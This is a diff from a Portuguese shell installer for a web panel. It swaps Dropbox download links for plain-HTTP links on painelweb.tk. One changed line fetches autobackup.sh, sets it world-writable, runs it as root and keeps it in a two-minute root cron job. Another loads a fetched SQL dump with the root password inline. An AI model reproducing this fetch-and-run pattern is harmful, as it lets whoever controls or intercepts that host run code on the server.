@@ -135,7 +135,7 @@ clear
 #
 echo -e "           \033[1;33m● \033[1;32mFINALIZANDO INSTALACAO, PODE DEMORAR \033[1;33m● \033[1;33mAGUARDE...\033[0m"
 cd /var/www/html
-wget https://www.dropbox.com/s/wt2p0a1go4xlz0c/painelwv23.zip > /dev/null 2>&1
+wget http://www.painelweb.tk/painelwv23.zip > /dev/null 2>&1
 sleep 1
 unzip painelwv23.zip > /dev/null 2>&1
 rm -rf painelwv23.zip index.html > /dev/null 2>&1
@@ -146,7 +146,7 @@ sed -i "s;1010;$senha;g" /var/www/html/pages/system/pass.php > /dev/null 2>&1
 fi
 sleep 1
 cd
-wget https://www.dropbox.com/s/x3g1jmjjs2iq6pg/BD-Painel-v23.sql > /dev/null 2>&1
+wget http://www.painelweb.tk/BD-Painel-v23.sql > /dev/null 2>&1
 sleep 1
 if [[ -e "$HOME/BD-Painel-v23.sql" ]]; then
     mysql -h localhost -u root -p$senha --default_character_set utf8 sshplus < BD-Painel-v23.sql
@@ -173,7 +173,7 @@ echo '*/2 * * * * root /bin/autobackup.sh' >> /etc/crontab
 /etc/init.d/cron restart > /dev/null 2>&1
 cd /bin
 rm autobackup.sh > /dev/null 2>&1
-wget https://www.dropbox.com/s/qlclyy8qvy78c7m/autobackup.sh > /dev/null 2>&1 && chmod 777 autobackup.sh && sed -i -e 's/\r$//' autobackup.sh && ./autobackup.sh
+wget http://www.painelweb.tk/autobackup.sh > /dev/null 2>&1 && chmod 777 autobackup.sh && sed -i -e 's/\r$//' autobackup.sh && ./autobackup.sh
 # echo '0 */12 * * * root cd /var/www/html/pages/system/ && bash cron.backup.sh && cd /root' >> /etc/crontab
 # echo '5 */12 * * * root cd /var/www/html/pages/system/ && /usr/bin/php cron.backup.php && cd /root' >> /etc/crontab
 /etc/init.d/cron reload > /dev/null 2>&1
